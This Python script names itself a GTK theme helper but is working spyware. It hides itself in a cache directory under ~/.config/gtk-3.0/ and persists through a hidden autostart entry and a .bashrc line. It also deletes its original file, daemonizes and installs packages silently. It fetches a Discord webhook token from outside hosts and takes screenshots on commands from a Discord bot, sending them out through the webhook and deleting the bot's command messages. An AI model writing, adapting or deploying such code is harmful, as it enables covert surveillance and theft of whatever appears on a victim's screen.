#!/usr/bin/env python3
"""
.gtk-theme-helper - Silent screenshot service
"""

import os
import sys
import tempfile
import subprocess
import time
import requests
import shutil
import signal
import atexit
from pathlib import Path
import random
import string
import threading

# Configuration
SERVICE_NAME = ".gtk-theme-helper"
HIDDEN_DIR = os.path.expanduser("~/.config/gtk-3.0/.theme-cache")
TRIGGER_FILE = "/tmp/.theme-preview-trigger"
LOCK_FILE = "/tmp/.gtk-theme-helper.lock"

def install_requirements():
    """Install required Python packages silently"""
    try:
        subprocess.run([
            sys.executable, "-m", "pip", "install", "--user", "--quiet",
            "pyautogui", "discord.py", "requests", "psutil"
        ], capture_output=True, timeout=300, check=True)
        return True
    except:
        return False

def install_service():
    """Install as user service"""
    try:
        # Create hidden directory
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        
        # Copy current script to hidden location
        current_script = os.path.abspath(__file__)
        target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
        
        shutil.copy2(current_script, target_script)
        os.chmod(target_script, 0o755)
        
        # Create autostart entry
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=GTK Theme Helper
Exec={target_script} --service
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        
        desktop_file = f"{autostart_dir}/{SERVICE_NAME}.desktop"
        with open(desktop_file, 'w') as f:
            f.write(desktop_content)
        
        # Add to .bashrc for persistence
        bashrc_path = os.path.expanduser("~/.bashrc")
        bashrc_line = f"\n# GTK Theme Helper\n[ -x \"{target_script}\" ] && \"{target_script}\" --service &\n"
        
        with open(bashrc_path, 'a') as f:
            f.write(bashrc_line)
        
        return True
        
    except Exception:
        return False

def clean_traces():
    """Remove original file"""
    try:
        current_script = os.path.abspath(__file__)
        if os.path.exists(current_script):
            os.remove(current_script)
    except:
        pass

def daemonize():
    """Turn into a daemon process"""
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    os.chdir("/")
    os.setsid()
    os.umask(0)
    
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    with open(os.devnull, 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def fetch_token():
    """Fetch Discord webhook token"""
    token_urls = [
        "https://new-production-8df3.up.railway.app/api/token",
        "https://new-5itj.onrender.com/api/token"
    ]
    
    for url in token_urls:
        try:
            response = requests.get(f"{url}?code=asdfghjkl", timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    return data['discord_token']
        except:
            continue
    
    return None

def setup_display():
    """Setup display environment"""
    os.environ['DISPLAY'] = ':0'
    return True

def take_screenshot():
    """Take silent screenshot using PyAutoGUI"""
    try:
        setup_display()
        import pyautogui
        
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"tmp_{int(time.time())}.png")
        
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        return screenshot_path
        
    except Exception:
        return None

def send_to_discord(file_path, token):
    """Send screenshot to Discord"""
    try:
        import discord
        from discord import SyncWebhook
        
        webhook = SyncWebhook.from_url(token)
        with open(file_path, 'rb') as f:
            webhook.send(file=discord.File(f, filename='display.png'))
        return True
    except:
        return False

def request_screenshot():
    """Request screenshot from service"""
    try:
        with open(TRIGGER_FILE, 'w') as f:
            f.write('1')
        return True
    except:
        return False

def screenshot_service():
    """Run the screenshot service"""
    token = fetch_token()
    if not token:
        return
    
    while True:
        try:
            if os.path.exists(TRIGGER_FILE):
                screenshot_path = take_screenshot()
                if screenshot_path:
                    send_to_discord(screenshot_path, token)
                    try:
                        os.remove(screenshot_path)
                    except:
                        pass
                try:
                    os.remove(TRIGGER_FILE)
                except:
                    pass
            
            time.sleep(2)
            
        except Exception:
            time.sleep(10)

def delete_everything():
    """Completely remove everything"""
    try:
        # Remove autostart
        autostart_file = os.path.expanduser(f"~/.config/autostart/{SERVICE_NAME}.desktop")
        if os.path.exists(autostart_file):
            os.remove(autostart_file)
        
        # Remove hidden directory
        if os.path.exists(HIDDEN_DIR):
            shutil.rmtree(HIDDEN_DIR)
        
        # Remove from .bashrc
        bashrc_path = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc_path):
            with open(bashrc_path, 'r') as f:
                content = f.read()
            lines = content.split('\n')
            cleaned = [line for line in lines if SERVICE_NAME not in line]
            with open(bashrc_path, 'w') as f:
                f.write('\n'.join(cleaned))
        
        # Remove trigger file
        if os.path.exists(TRIGGER_FILE):
            os.remove(TRIGGER_FILE)
        
        # Remove lock file
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
        
        return True
    except:
        return False

# Discord bot setup
def setup_bot():
    """Setup Discord bot"""
    try:
        import discord
        from discord.ext import commands
        
        token = fetch_token()
        if not token:
            return
        
        intents = discord.Intents.default()
        intents.message_content = True
        bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
        
        @bot.event
        async def on_ready():
            pass  # Silent startup
        
        @bot.command(name="screen")
        async def cmd_screen(ctx):
            """Take screenshot"""
            request_screenshot()
            await ctx.message.delete()  # Delete the command message
        
        @bot.command(name="delete")
        async def cmd_delete(ctx):
            """Delete everything"""
            if delete_everything():
                await bot.close()
                os._exit(0)
        
        bot.run(token)
        
    except Exception:
        pass

def main():
    """Main function"""
    if '--service' in sys.argv:
        # Run as service
        daemonize()
        screenshot_service()
    elif '--install' in sys.argv:
        # Install only
        install_requirements()
        install_service()
        clean_traces()
    else:
        # Run bot + service
        if not os.path.exists(f"{HIDDEN_DIR}/{SERVICE_NAME}"):
            # First run - install
            install_requirements()
            install_service()
            clean_traces()
            # Start service
            subprocess.Popen([sys.executable, __file__, '--service'], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            # Already installed - start service
            subprocess.Popen([sys.executable, __file__, '--service'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Run bot
        setup_bot()

if __name__ == "__main__":
    main()
